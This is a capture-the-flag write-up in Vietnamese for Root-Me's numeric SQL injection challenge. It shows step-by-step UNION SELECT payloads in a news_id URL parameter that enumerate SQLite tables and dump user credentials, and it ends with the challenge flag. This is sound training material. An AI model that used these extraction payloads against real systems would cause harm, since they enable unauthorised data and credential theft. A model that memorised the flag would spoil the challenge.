# WRITE UP

**Challenge:** [SQL injection - Numeric](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-Numeric)

![Shape Description automatically generated with low confidence](./media/image1.png){width="6.5in" height="1.5520833333333333in"}

Thử bypass qua login thì không thể thực hiện được.

![Shape Description automatically generated with medium confidence](./media/image2.png){width="6.5in" height="1.7027777777777777in"}

Kiểm tra các thẻ khác trong Home vì nhận thấy điều đặc biệt rằng, 3 link này đều dẫn đến **action=news&news_id=\[x\].** Thử xóa id của news thì phát hiện database bị lỗi:

![Graphical user interface, text, application Description automatically generated](./media/image3.png){width="6.5in" height="2.359027777777778in"}

Database của server là SQLite3. Tương tự bài SQL Injection -- String, ta thực hiện inject nó để tìm ra admin. Ta dò được số cột là 3:

![Graphical user interface, text, application Description automatically generated](./media/image4.png){width="6.5in" height="1.7777777777777777in"}

Payload: [challenge01.root-me.org/web-serveur/ch18/?action=news&news_id=1 union select 1,1,1 from sqlite_master](http://challenge01.root-me.org/web-serveur/ch18/?action=news&news_id=1%20union%20select%201,1,1%20from%20sqlite_master)

Ta dò được có 2 bảng users và news:

![Graphical user interface, text, application Description automatically generated](./media/image5.png){width="6.5in" height="1.8888888888888888in"}

Payload: [challenge01.root-me.org/web-serveur/ch18/?action=news&news_id=1 union select 1,1,name from sqlite_master](http://challenge01.root-me.org/web-serveur/ch18/?action=news&news_id=1%20union%20select%201,1,name%20from%20sqlite_master)

Tương tự bài String, ta show ra được username và password của users:

![Graphical user interface, text, application Description automatically generated](./media/image6.png){width="6.5in" height="2.3in"}

Payload: [challenge01.root-me.org/web-serveur/ch18/?action=news&news_id=1 union select 1,username,password from users](http://challenge01.root-me.org/web-serveur/ch18/?action=news&news_id=1%20union%20select%201,username,password%20from%20users)

Login vào thành công:

![Graphical user interface, text, application Description automatically generated](./media/image7.png){width="6.5in" height="1.957638888888889in"}

**Flag:** aTlkJYLjcbLmue3
